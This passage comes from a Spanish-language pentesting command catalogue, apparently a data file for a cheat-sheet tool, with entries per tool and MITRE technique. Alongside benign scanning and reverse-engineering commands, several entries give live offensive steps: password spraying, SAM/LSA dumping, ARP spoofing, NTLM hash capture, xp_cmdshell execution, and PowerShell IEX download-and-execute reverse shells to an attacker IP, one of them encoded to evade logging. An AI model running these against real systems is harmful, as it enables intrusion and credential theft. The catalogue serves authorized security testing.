    description: 'Encuentra vulnerabilidades de seguridad en código fuente. Soporta 30+ lenguajes. p/owasp-top-ten cubre el top 10 de OWASP.',
    tags: ['sast', 'code-review', 'devsecops'],
    notes: 'Instalar: pip install semgrep. Rules gratuitas en semgrep.dev/r',
  },

  // ── TRUFFLEHOG ────────────────────────────────────────────────────────────
  {
    id: 'trufflehog-local',
    tool: 'trufflehog', phase: 'recon', category: 'Secret Scanning',
    title: 'Buscar secrets en repo local',
    command: 'trufflehog git file://. --only-verified\ntrufflehog git file://. --json | jq .',
    description: 'Detecta secrets verificados (API keys activas, tokens) en el historial de git. --only-verified reduce falsos positivos.',
    tags: ['secrets', 'git', 'credentials', 'devsecops'],
    mitreId: 'T1552',
  },
  {
    id: 'trufflehog-github',
    tool: 'trufflehog', phase: 'recon', category: 'Secret Scanning',
    title: 'Escanear org de GitHub',
    command: 'trufflehog github --org=target-org --only-verified\ntrufflehog github --repo=https://github.com/user/repo',
    description: 'Escanea todos los repos de una organización de GitHub buscando secrets filtrados en commits históricos.',
    tags: ['secrets', 'github', 'osint'],
  },

  // ── GITLEAKS ──────────────────────────────────────────────────────────────
  {
    id: 'gitleaks-detect',
    tool: 'gitleaks', phase: 'recon', category: 'Secret Scanning',
    title: 'Detectar secrets en repo',
    command: 'gitleaks detect --source . -v\ngitleaks detect --source . --report-path gitleaks.json --report-format json',
    description: 'Escanea el repo actual buscando secrets. Más rápido que trufflehog, bueno para pipelines CI/CD.',
    tags: ['secrets', 'git', 'ci-cd', 'devsecops'],
    mitreId: 'T1552',
    notes: 'Instalar: brew install gitleaks o descargar binary desde GitHub releases',
  },

  // ── HTTPIE ────────────────────────────────────────────────────────────────
  {
    id: 'httpie-get',
    tool: 'httpie', phase: 'recon', category: 'API Testing',
    title: 'GET con headers',
    command: 'http GET https://api.target.com/users Authorization:"Bearer token123"\nhttp GET https://api.target.com/v1/users X-API-Key:secretkey123',
    description: 'HTTPie tiene sintaxis más legible que curl para testing de APIs. Headers se pasan como Key:Value sin comillas extras.',
    tags: ['api', 'http', 'get', 'headers'],
  },
  {
    id: 'httpie-post',
    tool: 'httpie', phase: 'exploitation', category: 'API Testing',
    title: 'POST JSON + auth',
    command: "http POST https://api.target.com/users name=test email=test@test.com Authorization:'Bearer token'\nhttp --form POST https://target.com/login username=admin password=test",
    description: 'POST con JSON automático (clave=valor → JSON object). --form para enviar form-data en lugar de JSON.',
    tags: ['api', 'post', 'json', 'auth'],
  },

  // ── CRACKMAPEXEC ──────────────────────────────────────────────────────────
  {
    id: 'cme-smb-enum',
    tool: 'crackmapexec', phase: 'scanning', category: 'Enumeración',
    title: 'Enumerar hosts SMB',
    command: 'crackmapexec smb 192.168.1.0/24\ncrackmapexec smb <target> -u admin -p Password123 --shares\ncrackmapexec smb <target> -u admin -p Password123 --users',
    description: 'Descubre hosts Windows en la red, verifica credenciales y enumera shares y usuarios. Esencial para red interna.',
    tags: ['smb', 'windows', 'enum', 'ad'],
    mitreId: 'T1021',
  },
  {
    id: 'cme-spray',
    tool: 'crackmapexec', phase: 'exploitation', category: 'Password Spray',
    title: 'Password spray',
    command: 'crackmapexec smb 192.168.1.0/24 -u users.txt -p Password2024! --continue-on-success\ncrackmapexec winrm <target> -u admin -p Password123 -x "whoami"',
    description: 'Password spray contra múltiples hosts. --continue-on-success no se detiene al primer éxito. winrm para ejecutar comandos remotos.',
    tags: ['password-spray', 'brute-force', 'winrm'],
    mitreId: 'T1110',
    notes: 'Cuidado con lockouts: usar una contraseña por vez con delay entre intentos.',
  },
  {
    id: 'cme-sam',
    tool: 'crackmapexec', phase: 'post_exploitation', category: 'Credential Dumping',
    title: 'Dump SAM / LSA',
    command: 'crackmapexec smb <target> -u admin -p Password123 --sam\ncrackmapexec smb <target> -u admin -p Password123 --lsa',
    description: 'Dump remoto del SAM (hashes locales) y LSA secrets. Requiere privilegios de admin.',
    tags: ['dump', 'credentials', 'sam', 'windows'],
    mitreId: 'T1003',
  },

  // ── BLOODHOUND ────────────────────────────────────────────────────────────
  {
    id: 'bloodhound-collect',
    tool: 'bloodhound', phase: 'recon', category: 'AD Enumeration',
    title: 'Recolectar datos del AD',
    command: 'bloodhound-python -u user -p Password123 -d domain.local -c All -ns <dc-ip>\nbloodhound-python -u user -p Password123 -d domain.local -c All --zip',
    description: 'Recolecta datos del Active Directory (usuarios, grupos, GPOs, trusts, sesiones) para analizar en BloodHound GUI.',
    tags: ['ad', 'enum', 'bloodhound', 'domain'],
    mitreId: 'T1069',
    notes: 'Subir los JSON generados al GUI de BloodHound. Buscar ShortestPath to DA como primer análisis.',
  },

  // ── EVIL-WINRM ────────────────────────────────────────────────────────────
  {
    id: 'evilwinrm-connect',
    tool: 'evilwinrm', phase: 'post_exploitation', category: 'Remote Shell',
    title: 'Conectar vía WinRM',
    command: 'evil-winrm -i <target> -u administrator -p Password123\nevil-winrm -i <target> -u administrator -H <ntlm-hash>',
    description: 'Shell PowerShell remota via WinRM (puerto 5985/5986). Soporta pass-the-hash directamente con -H.',
    tags: ['winrm', 'shell', 'windows', 'lateral-movement'],
    mitreId: 'T1021',
    notes: 'WinRM debe estar habilitado: winrm quickconfig en el target. Por defecto en Windows Server.',
  },

  // ── RESPONDER ─────────────────────────────────────────────────────────────
  {
    id: 'responder-capture',
    tool: 'responder', phase: 'exploitation', category: 'MITM / Credential Capture',
    title: 'Capturar hashes NetNTLM',
    command: 'responder -I eth0 -rdwv\n# Los hashes se guardan en /usr/share/responder/logs/\n# Crackear: hashcat -m 5600 netntlmv2.txt rockyou.txt',
    description: 'Responde a queries LLMNR, NBT-NS y mDNS capturando hashes NetNTLMv2. Muy efectivo en redes corporativas.',
    tags: ['llmnr', 'mitm', 'capture', 'ntlm', 'windows'],
    mitreId: 'T1557',
    notes: 'Deshabilitar respuestas si se combina con ntlmrelayx para relay attack.',
  },

  // ── BETTERCAP ─────────────────────────────────────────────────────────────
  {
    id: 'bettercap-arp',
    tool: 'bettercap', phase: 'exploitation', category: 'MITM',
    title: 'ARP spoofing + MITM',
    command: 'bettercap -iface eth0\n# En la consola de bettercap:\nnet.probe on\nnet.recon on\nset arp.spoof.targets 192.168.1.100\narp.spoof on\nnet.sniff on',
    description: 'ARP spoofing para interceptar tráfico de la víctima. net.probe descubre hosts, arp.spoof hace el MITM, net.sniff captura.',
    tags: ['arp-spoof', 'mitm', 'sniffing', 'lan'],
    mitreId: 'T1557',
    notes: 'Requiere ip_forward habilitado: echo 1 > /proc/sys/net/ipv4/ip_forward',
  },

  // ── AIRCRACK-NG ───────────────────────────────────────────────────────────
  {
    id: 'aircrack-capture',
    tool: 'aircrackng', phase: 'scanning', category: 'WiFi Audit',
    title: 'Captura de handshake WPA',
    command: 'airmon-ng start wlan0\nairodump-ng wlan0mon\nairodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon\naireplay-ng -0 5 -a <BSSID> wlan0mon  # Deauth para forzar handshake',
    description: 'Poner la tarjeta en monitor mode, escanear redes, capturar el handshake WPA2. El deauth fuerza a los clientes a reconectarse.',
    tags: ['wifi', 'wpa', 'handshake', 'monitor-mode'],
  },
  {
    id: 'aircrack-crack',
    tool: 'aircrackng', phase: 'exploitation', category: 'WiFi Audit',
    title: 'Crackear handshake WPA',
    command: 'aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt\nhashcat -m 22000 capture-01.hc22000 rockyou.txt  # Más rápido con GPU',
    description: 'Crackear el handshake WPA2 capturado con wordlist. Hashcat en modo 22000 es mucho más rápido que aircrack (GPU).',
    tags: ['wifi', 'wpa', 'cracking', 'wordlist'],
    notes: 'Convertir para hashcat: hcxpcapngtool -o hash.hc22000 capture-01.cap',
  },

  // ── WIFITE ────────────────────────────────────────────────────────────────
  {
    id: 'wifite-auto',
    tool: 'wifite', phase: 'exploitation', category: 'WiFi Audit',
    title: 'Ataque automático a WiFi',
    command: 'wifite --wpa --dict /usr/share/wordlists/rockyou.txt\nwifite -i wlan0 --kill --wpa --pmkid',
    description: 'Automatiza todo el proceso: pone en monitor mode, escanea, elige targets, captura handshakes y los crackea.',
    tags: ['wifi', 'automated', 'wpa', 'pmkid'],
    notes: 'PMKID attack no requiere cliente conectado — más efectivo que esperar handshake.',
  },

  // ── APKTOOL ───────────────────────────────────────────────────────────────
  {
    id: 'apktool-decompile',
    tool: 'apktool', phase: 'recon', category: 'Android Analysis',
    title: 'Decompilar APK',
    command: 'apktool d app.apk -o app_decoded/\napktool d app.apk -o app_decoded/ --no-src  # Solo recursos/manifest',
    description: 'Decompila el APK a Smali (bytecode legible), XML de resources y AndroidManifest. Para ver permisos, actividades, intents.',
    tags: ['android', 'apk', 'decompile', 'smali'],
  },
  {
    id: 'apktool-recompile',
    tool: 'apktool', phase: 'exploitation', category: 'Android Analysis',
    title: 'Recompilar y firmar APK modificado',
    command: 'apktool b app_decoded/ -o app_modified.apk\nkeytool -genkey -v -keystore my.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000\napksigner sign --ks my.keystore app_modified.apk',
    description: 'Recompila el APK modificado y lo firma. Necesario para instalarlo en el dispositivo después de parchear.',
    tags: ['android', 'apk', 'recompile', 'patching'],
  },

  // ── JADX ──────────────────────────────────────────────────────────────────
  {
    id: 'jadx-decompile',
    tool: 'jadx', phase: 'recon', category: 'Android Analysis',
    title: 'Decompilar APK a Java',
    command: 'jadx -d output/ app.apk\njadx-gui app.apk  # Versión con UI',
    description: 'Convierte el bytecode DEX a código Java legible. Mucho más legible que Smali. Ideal para buscar hardcoded secrets, lógica de auth.',
    tags: ['android', 'decompile', 'java', 'reverse'],
    notes: 'Buscar en el output: grep -r "password\\|secret\\|api_key\\|token" output/',
  },

  // ── FRIDA ─────────────────────────────────────────────────────────────────
  {
    id: 'frida-hook',
    tool: 'frida', phase: 'exploitation', category: 'Dynamic Analysis',
    title: 'Hooking de funciones en runtime',
    command: 'frida -U -f com.target.app --no-pause -l script.js\nfrida-ps -Ua  # Listar apps en ejecución en dispositivo USB',
    description: 'Intercepta y modifica el comportamiento de apps en tiempo real. Útil para bypass de certificate pinning, anti-root, lógica de auth.',
    tags: ['android', 'ios', 'hooking', 'runtime', 'dynamic'],
    notes: 'Para SSL pinning bypass: usar frida-codeshare.io/interference-security/frida-multiple-unpinning',
  },

  // ── AWS CLI ───────────────────────────────────────────────────────────────
  {
    id: 'aws-enum',
    tool: 'awscli', phase: 'recon', category: 'Cloud Enumeration',
    title: 'Enumeración básica de AWS',
    command: 'aws sts get-caller-identity\naws iam list-users\naws s3 ls\naws s3 ls s3://target-bucket --no-sign-request  # Sin autenticar',
    description: 'Primer paso al tener credenciales AWS: identificar el usuario, listar recursos. --no-sign-request para buckets públicos.',
    tags: ['aws', 'cloud', 'enum', 'iam', 's3'],
    notes: 'Configurar credenciales: aws configure o export AWS_ACCESS_KEY_ID=...',
  },
  {
    id: 'aws-privesc',
    tool: 'awscli', phase: 'post_exploitation', category: 'Cloud Pentesting',
    title: 'Buscar permisos y escalar',
    command: 'aws iam get-user\naws iam list-attached-user-policies --user-name <user>\naws iam list-role-policies --role-name <role>\naws ec2 describe-instances --query "Reservations[*].Instances[*].[InstanceId,PublicIpAddress,Tags]"',
    description: 'Enumerar permisos IAM y recursos EC2. Buscar políticas permisivas, roles asumibles y metadata endpoints.',
    tags: ['aws', 'iam', 'privesc', 'cloud'],
  },

  // ── TRIVY ─────────────────────────────────────────────────────────────────
  {
    id: 'trivy-image',
    tool: 'trivy', phase: 'scanning', category: 'Container Security',
    title: 'Scan de imagen Docker',
    command: 'trivy image nginx:latest\ntrivy image --severity HIGH,CRITICAL myapp:latest\ntrivy image --format json -o report.json myapp:latest',
    description: 'Escanea imágenes Docker por vulnerabilidades en OS packages y dependencias de aplicación. Filtrar por severidad.',
    tags: ['docker', 'container', 'vuln-scan', 'devsecops'],
    notes: 'Instalar: apt install trivy o curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh',
  },
  {
    id: 'trivy-iac',
    tool: 'trivy', phase: 'scanning', category: 'IaC Security',
    title: 'Scan de IaC / filesystem',
    command: 'trivy fs ./proyecto/\ntrivy config ./terraform/\ntrivy fs . --scanners secret,config',
    description: 'Detecta misconfigurations en Terraform, Kubernetes YAML, Dockerfile y secrets hardcodeados en el código.',
    tags: ['iac', 'terraform', 'kubernetes', 'secrets', 'devsecops'],
  },

  // ── KUBECTL ───────────────────────────────────────────────────────────────
  {
    id: 'kubectl-enum',
    tool: 'kubectl', phase: 'recon', category: 'Kubernetes Enumeration',
    title: 'Enumeración de clúster',
    command: 'kubectl get pods -A\nkubectl get nodes\nkubectl get secrets -A -o yaml\nkubectl auth can-i --list  # Ver permisos propios',
    description: 'Enumerar recursos del clúster Kubernetes. get secrets -A es de alto impacto si hay acceso. can-i muestra qué podés hacer.',
    tags: ['kubernetes', 'k8s', 'cloud', 'enum'],
  },
  {
    id: 'kubectl-exec',
    tool: 'kubectl', phase: 'post_exploitation', category: 'Kubernetes Pentesting',
    title: 'Exec en pod + escape',
    command: 'kubectl exec -it <pod-name> -- /bin/bash\nkubectl exec -it <pod-name> -n <namespace> -- sh\n# Desde dentro del pod:\ncurl http://169.254.169.254/latest/meta-data/  # AWS metadata',
    description: 'Ejecutar shell en un pod. Una vez dentro, buscar secretos montados, service account tokens y metadata de cloud.',
    tags: ['kubernetes', 'exec', 'escape', 'privesc'],
  },

  // ── GHIDRA ────────────────────────────────────────────────────────────────
  {
    id: 'ghidra-analyze',
    tool: 'ghidra', phase: 'recon', category: 'Reverse Engineering',
    title: 'Análisis estático de binario',
    command: '# GUI: ghidraRun\n# Headless (batch):\nghidraRun ~/ghidra_projects MyProject -import binary.elf -analyzeHeadless\n# Buscar strings: Window → Defined Strings',
    description: 'Framework gratuito de la NSA para reversing. Análisis estático, decompilación a pseudocódigo C, grafos de control de flujo.',
    tags: ['reversing', 'static-analysis', 'decompile', 'binary'],
    notes: 'Requiere JDK 17+. Descargar desde ghidra-sre.org. En Kali: apt install ghidra',
  },

  // ── RADARE2 ───────────────────────────────────────────────────────────────
  {
    id: 'radare2-basic',
    tool: 'radare2', phase: 'recon', category: 'Reverse Engineering',
    title: 'Análisis y disassembly',
    command: 'r2 -A binary          # Analizar y abrir\n# Comandos básicos dentro de r2:\nafl                 # Listar funciones\npdf @ main          # Disassemblar main\naaa                 # Análisis completo\niz                  # Strings del binario\nq                   # Salir',
    description: 'Radare2 es el framework de reversing más poderoso de línea de comandos. Curva de aprendizaje alta pero muy completo.',
    tags: ['reversing', 'disassembly', 'binary', 'cli'],
    notes: 'Alternativa con UI: cutter (GUI para radare2). Instalar: apt install radare2',
  },

  // ── GDB ───────────────────────────────────────────────────────────────────
  {
    id: 'gdb-debug',
    tool: 'gdb', phase: 'recon', category: 'Debugging / Exploit Dev',
    title: 'Debugging básico',
    command: 'gdb ./binary\n# Comandos GDB:\nrun arg1 arg2    # Ejecutar con args\nbreak main       # Breakpoint en main\ninfo functions   # Listar funciones\nx/20x $esp       # Examinar stack\ninfo registers   # Ver registros',
    description: 'GDB para debugging y desarrollo de exploits. Analizar crashes, examinar memoria, entender flujo de ejecución.',
    tags: ['debug', 'exploit-dev', 'binary', 'memory'],
    notes: 'Con pwndbg o peda: mejora mucho la UX. apt install gdb-pwndbg',
  },
  {
    id: 'gdb-checksec',
    tool: 'gdb', phase: 'recon', category: 'Debugging / Exploit Dev',
    title: 'Verificar protecciones del binario',
    command: 'checksec --file=binary\nfile binary\nstrings binary | grep -i "pass\\|key\\|secret"\nreadelf -h binary',
    description: 'Antes de explotar: verificar NX, ASLR, PIE, Stack Canary, RELRO. checksec de pwntools/pwndbg lo resume todo.',
    tags: ['checksec', 'binary-analysis', 'protections'],
    notes: 'pip install pwntools → from pwn import *; checksec(binary="./binary")',
  },

  // ── BINWALK ───────────────────────────────────────────────────────────────
  {
    id: 'binwalk-extract',
    tool: 'binwalk', phase: 'recon', category: 'Firmware Analysis',
    title: 'Analizar y extraer firmware',
    command: 'binwalk firmware.bin\nbinwalk -e firmware.bin\nbinwalk -Me firmware.bin  # Extracción recursiva',
    description: 'Analiza firmware buscando filesystems, headers y archivos embebidos. -e extrae, -M es recursivo para filesystems anidados.',
    tags: ['firmware', 'iot', 'extraction', 'embedded'],
    notes: 'Instalar dependencias: apt install binwalk squashfs-tools sasquatch',
  },

  // ── SMBCLIENT ─────────────────────────────────────────────────────────────
  {
    id: 'smbclient-list-anon',
    tool: 'smbclient', phase: 'recon', category: 'SMB Enumeration',
    title: 'Listar shares — anónimo',
    command: 'smbclient -L <target> -N',
    description: 'Lista recursos compartidos SMB sin autenticación (-N = no password). Útil para detectar shares públicos.',
    tags: ['smb', 'enum', 'anonymous', 'windows'],
    mitreId: 'T1135',
    notes: '-L para listar, -N para conexión anónima. Si da "NT_STATUS_ACCESS_DENIED" probar con -U ""',
  },
  {
    id: 'smbclient-list-auth',
    tool: 'smbclient', phase: 'recon', category: 'SMB Enumeration',
    title: 'Listar shares — autenticado',
    command: 'smbclient -L <target> -U "<usuario>"',
    description: 'Lista shares usando credenciales conocidas. Pedirá la contraseña interactivamente.',
    tags: ['smb', 'enum', 'auth', 'windows'],
    mitreId: 'T1135',
  },
  {
    id: 'smbclient-connect',
    tool: 'smbclient', phase: 'recon', category: 'SMB Enumeration',
    title: 'Conectar a un share',
    command: 'smbclient \\\\<target>\\<share> -U "<usuario>"\n# Comandos dentro del cliente SMB:\n# dir          → listar\n# get <file>   → descargar\n# put <file>   → subir\n# bye          → salir',
    description: 'Conecta a un share SMB específico. Dentro del cliente interactivo: dir, get, put, ls, cd.',
    tags: ['smb', 'file-transfer', 'windows'],
    mitreId: 'T1039',
    notes: 'Si el pass tiene caracteres especiales ($) escapar con \\$ o usar comillas simples.',
  },
  {
    id: 'smbclient-ftp-anon',
    tool: 'smbclient', phase: 'recon', category: 'FTP',
    title: 'FTP — conexión anónima',
    command: 'ftp <target>\n# Usuario: anonymous\n# Password: (enter vacío o cualquier email)\n# Comandos:\n# ls / dir   → listar\n# get <file> → descargar\n# put <file> → subir\n# bye        → salir',
    description: 'Conexión FTP con usuario anonymous. Muchos servidores FTP mal configurados permiten acceso anónimo con lectura o escritura.',
    tags: ['ftp', 'anonymous', 'enum', 'file-transfer'],
    mitreId: 'T1210',
    notes: 'FTP corre en puerto 21. Nmap: -sV detecta si permite anon con script ftp-anon.',
  },

  // ── OLETOOLS ──────────────────────────────────────────────────────────────
  {
    id: 'oletools-olevba',
    tool: 'oletools', phase: 'recon', category: 'Malware Analysis',
    title: 'olevba — analizar macros VBA',
    command: 'olevba <archivo>.xlsm\nolevba <archivo>.doc\nolevba <archivo>.xls --decode  # Decodifica strings hex/base64 en el código VBA',
    description: 'Extrae y analiza macros VBA de archivos Office (xls, xlsx, xlsm, doc, docm, ppt). Muestra código, keywords sospechosos y strings codificados. Ideal para análisis de phishing o cuando encontrás un Office en un share.',
    tags: ['macro', 'vba', 'office', 'malware-analysis', 'phishing'],
    mitreId: 'T1566',
    notes: 'Instalar: pip install oletools. Buscar cadenas de conexión, credenciales hardcodeadas, y URLs en el código VBA.',
  },
  {
    id: 'oletools-mraptor',
    tool: 'oletools', phase: 'recon', category: 'Malware Analysis',
    title: 'mraptor — detectar macros maliciosas',
    command: 'mraptor <archivo>.xlsm\nmraptor -r /ruta/directorio/  # Escanear directorio recursivo',
    description: 'Detecta automáticamente si un archivo Office contiene macros que ejecutan comandos, acceden a internet o al sistema de archivos. Útil para triage rápido de múltiples archivos.',
    tags: ['macro', 'vba', 'office', 'malware-analysis', 'triage'],
    mitreId: 'T1566',
  },
  {
    id: 'oletools-oleid',
    tool: 'oletools', phase: 'recon', category: 'Malware Analysis',
    title: 'oleid — identificar características de archivos OLE',
    command: 'oleid <archivo>.doc\noleid <archivo>.xls',
    description: 'Identifica características de archivos OLE/Office: si contiene macros VBA, Flash, objetos externos, si está cifrado. Primer paso antes de olevba.',
    tags: ['office', 'ole', 'malware-analysis', 'recon'],
  },

  // ── IMPACKET — MSSQL / SMB SERVER ─────────────────────────────────────────
  {
    id: 'impacket-mssqlclient',
    tool: 'impacket', phase: 'exploitation', category: 'Database Exploitation',
    title: 'mssqlclient — conectar a MSSQL',
    command: 'impacket-mssqlclient WORKGROUP/<user>:<pass>@<target> -windows-auth\n# Si la contraseña tiene $ escapar: pass\\$word',
    description: 'Cliente interactivo para Microsoft SQL Server. Con -windows-auth usa autenticación NTLM en lugar de SQL. Punto de entrada para explotar xp_cmdshell y pivotar a ejecución de comandos.',
    tags: ['mssql', 'database', 'windows', 'exploitation'],
    mitreId: 'T1505',
    notes: 'Primero validar credenciales con: crackmapexec mssql <target> -u user -p pass -d WORKGROUP',
  },
  {
    id: 'impacket-xpcmdshell',
    tool: 'impacket', phase: 'exploitation', category: 'Database Exploitation',
    title: 'xp_cmdshell — habilitar y ejecutar comandos',
    command: '-- Desde mssqlclient:\nsp_configure "show advanced options", 1\nRECONFIGURE\nsp_configure "xp_cmdshell", 1\nRECONFIGURE\n\n-- Ejecutar comandos:\nxp_cmdshell "whoami"\nxp_cmdshell "dir C:\\"\n\n-- PowerShell reverse shell desde SQL:\nxp_cmdshell """powershell IEX(New-Object Net.WebClient).downloadString(\'http://<tu-ip>/shell.ps1\')"""',
    description: 'Habilita xp_cmdshell en MSSQL para ejecutar comandos del SO. Requiere privilegios de sysadmin. Permite descargar y ejecutar payloads vía PowerShell.',
    tags: ['mssql', 'rce', 'windows', 'exploitation', 'xp_cmdshell'],
    mitreId: 'T1505',
    notes: 'Si sp_configure falla con "permission denied" el usuario no tiene sysadmin. Buscar usuario con más privilegios.',
  },
  {
    id: 'impacket-smbserver-ntlm',
    tool: 'impacket', phase: 'exploitation', category: 'Credential Capture',
    title: 'smbserver — capturar NTLMv2 hash',
    command: '# 1. Montar SMB server en nuestra máquina:\nsudo impacket-smbserver smbfolder $(pwd) -smb2support\n\n# 2. Desde la consola MSSQL forzar autenticación:\nxp_dirtree "\\\\<tu-ip>\\smbfolder\\"\n\n# 3. El hash NTLMv2 aparece en el listener\n# 4. Crackear:\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\nhashcat -m 5600 hash.txt rockyou.txt',
    description: 'Técnica para capturar hashes NTLMv2 forzando autenticación de MSSQL contra nuestro SMB server. El servidor SQL intentará conectarse y enviará sus credenciales automáticamente.',
    tags: ['ntlm', 'capture', 'mssql', 'windows', 'lateral-movement'],
    mitreId: 'T1187',
    notes: 'También funciona con xp_fileexist, OpenRowset, y desde cualquier función que haga requests de red.',
  },
  {
    id: 'impacket-psexec-escape',
    tool: 'impacket', phase: 'post_exploitation', category: 'Lateral Movement',
    title: 'psexec — escapar caracteres especiales',
    command: '# Contraseña con ! (escapar con \\!)\npsexec.py WORKGROUP/Administrator:MyPass\\!\\!1\\!@<target> cmd.exe\n\n# Pass-the-hash (pth-winexe alternativo):\npth-winexe -U WORKGROUP/Administrator%<LM:NTLM-HASH> //<target> cmd.exe',
    description: 'Variantes de psexec para contraseñas con caracteres especiales (!, $, etc.) que el shell interpreta. pth-winexe como alternativa para pass-the-hash.',
    tags: ['psexec', 'pth', 'windows', 'lateral-movement'],
    mitreId: 'T1021',
    notes: 'En bash los ! en strings deben escaparse con \\! o usar comillas simples: \'pass!!\'',
  },

  // ── NISHANG — PowerShell Ofensivo ─────────────────────────────────────────
  {
    id: 'nishang-reverse',
    tool: 'nishang', phase: 'exploitation', category: 'PowerShell Offensive',
    title: 'Invoke-PowerShellTcp — reverse shell',
    command: '# 1. Copiar y preparar el script:\ncp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1\n# Agregar al FINAL del archivo:\n# Invoke-PowerShellTcp -Reverse -IPAddress <tu-ip> -Port 443\n\n# 2. Levantar HTTP server:\npython3 -m http.server 80\n\n# 3. Listener:\nrlwrap nc -nlvp 443\n\n# 4. Ejecutar desde el target (PowerShell):\npowershell IEX(New-Object Net.WebClient).downloadString("http://<tu-ip>/shell.ps1")\n\n# O desde xp_cmdshell en MSSQL:\nxp_cmdshell """powershell IEX(New-Object Net.WebClient).downloadString(\'http://<tu-ip>/shell.ps1\')"""',
    description: 'Reverse shell PowerShell de Nishang. No sube ningún archivo — el script se ejecuta en memoria (fileless). Ideal desde MSSQL xp_cmdshell o cuando se tiene ejecución de comandos Windows.',
    tags: ['powershell', 'reverse-shell', 'windows', 'fileless'],
    mitreId: 'T1059',
    notes: 'Si PowerShell está en 32-bit usar la ruta nativa: C:\\Windows\\Sysnative\\WindowsPowerShell\\v1.0\\powershell.exe',
  },
  {
    id: 'nishang-ps-native',
    tool: 'nishang', phase: 'exploitation', category: 'PowerShell Offensive',
    title: 'PowerShell nativo de 64-bit desde proceso 32-bit',
    command: '# Detectar si el proceso actual es de 64-bit:\n[environment]::Is64BitOperatingSystem  # true = SO 64-bit\n[environment]::Is64BitProcess           # true = proceso actual 64-bit\n\n# Si el proceso es 32-bit pero el SO es 64-bit, usar la ruta Sysnative:\nxp_cmdshell """C:\\Windows\\Sysnative\\WindowsPowerShell\\v1.0\\powershell.exe IEX(New-Object Net.WebClient).downloadString(\'http://<tu-ip>/shell.ps1\')"""',
    description: 'Algunos contextos (xp_cmdshell, WOW64) dan un proceso PowerShell de 32-bit aunque el SO sea de 64-bit. Sysnative es un alias que redirige al binario nativo de 64-bit. Importante para herramientas como PowerSploit que solo funcionan en 64-bit.',
    tags: ['powershell', 'windows', '64-bit', 'sysnative'],
    mitreId: 'T1059',
  },
  {
    id: 'nishang-iex-download',
    tool: 'nishang', phase: 'exploitation', category: 'PowerShell Offensive',
    title: 'IEX download + execute (fileless)',
    command: '# Descargar y ejecutar en memoria sin tocar disco:\npowershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString(\'http://<tu-ip>/script.ps1\')"\n\n# Variante con wget:\npowershell -c "(New-Object Net.WebClient).DownloadString(\'http://<tu-ip>/script.ps1\') | IEX"\n\n# Variante encodada para evadir logging:\npowershell -ep bypass -enc <base64-payload>',
    description: 'Patrón para descargar y ejecutar scripts PowerShell en memoria (fileless). IEX = Invoke-Expression ejecuta el string como código. Útil para cargar módulos como PowerUp, PowerView, Invoke-Mimikatz.',
    tags: ['powershell', 'fileless', 'windows', 'download'],
    mitreId: 'T1059',
    notes: '-ep bypass deshabilita la execution policy para esa sesión. No requiere admin.',
  },

  // ── POWERSPLOIT / PowerUp ─────────────────────────────────────────────────
  {
    id: 'powersploit-powerup',
    tool: 'powersploit', phase: 'post_exploitation', category: 'Windows PrivEsc',
    title: 'PowerUp — Invoke-AllChecks',
    command: '# Desde tu máquina: agregar al final del archivo PowerUp.ps1:\n# Invoke-AllChecks\n\n# Servir y ejecutar en el target:\npython3 -m http.server 80\nIEX(New-Object Net.WebClient).downloadString("http://<tu-ip>/PowerUp.ps1")\n\n# Buscar en la salida:\n# - Cached GPP Files (credenciales en GPO)\n# - Unquoted Service Paths\n# - Modifiable Service Binaries\n# - AlwaysInstallElevated',
    description: 'PowerUp es el módulo de escalación de privilegios de PowerSploit. Invoke-AllChecks revisa todas las vías conocidas: servicios vulnerables, credenciales cacheadas en GPP, AlwaysInstallElevated, paths sin comillas, etc.',
    tags: ['privesc', 'windows', 'powershell', 'gpp', 'services'],
    mitreId: 'T1068',
    notes: 'IMPORTANTE: funciona correctamente solo en procesos de 64-bit. En 32-bit no lista todas las vulnerabilidades. Verificar con [environment]::Is64BitProcess.',
  },
  {
    id: 'powersploit-powerup-gpp',
    tool: 'powersploit', phase: 'post_exploitation', category: 'Windows PrivEsc',
    title: 'Credenciales en GPP (Group Policy Preferences)',
    command: '# PowerUp detecta automáticamente con Invoke-AllChecks\n# Manualmente buscar archivos Groups.xml:\nGet-ChildItem -Path C:\\ProgramData\\Microsoft\\Group*Policy -Recurse -Filter "Groups.xml" 2>$null\n\n# Leer contenido:\nGet-Content "C:\\ProgramData\\Microsoft\\Group Policy\\History\\...\\Groups.xml"',
    description: 'Las GPP almacenan contraseñas cifradas con AES-256 pero la clave fue publicada por Microsoft. PowerUp las descifra automáticamente. Afecta a Windows Server 2003-2008 o cualquier AD que aún use GPP para configurar contraseñas locales.',
    tags: ['gpp', 'privesc', 'windows', 'ad', 'credentials'],
    mitreId: 'T1552',
    notes: 'La clave de cifrado fue publicada en https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx',
  },
  {
    id: 'powersploit-powerview',
    tool: 'powersploit', phase: 'recon', category: 'AD Enumeration',
    title: 'PowerView — enumerar Active Directory',
    command: 'IEX(New-Object Net.WebClient).downloadString("http://<tu-ip>/PowerView.ps1")\n\n# Enumerar el dominio:\nGet-Domain\nGet-DomainUser | select name, description, memberof\nGet-DomainGroup -Name "Domain Admins" | select member\nGet-DomainComputer | select dnshostname, operatingsystem\nGet-DomainGPO | select displayname\nFind-LocalAdminAccess  # Hosts donde el usuario actual es local admin',
    description: 'PowerView es la herramienta de enumeración AD de PowerSploit. Alternativa a BloodHound para entender la estructura del dominio desde una shell ya comprometida.',
    tags: ['ad', 'enum', 'powershell', 'domain', 'recon'],
    mitreId: 'T1069',
    notes: 'Parte de PowerSploit: https://github.com/PowerShellMafia/PowerSploit. Requiere una sesión de dominio.',
  },

  // ── WINDOWS BUILT-INS — Técnicas post-compromiso ─────────────────────────
  {
    id: 'win-whoami-priv',
    tool: 'windows-builtins', phase: 'post_exploitation', category: 'Enumeración Local',
    title: 'whoami — privelegios y grupos',
    command: 'whoami\nwhoami /priv     # Listar privilegios habilitados\nwhoami /groups   # Grupos del usuario actual\nwhoami /all      # Todo: usuario + grupos + privilegios',
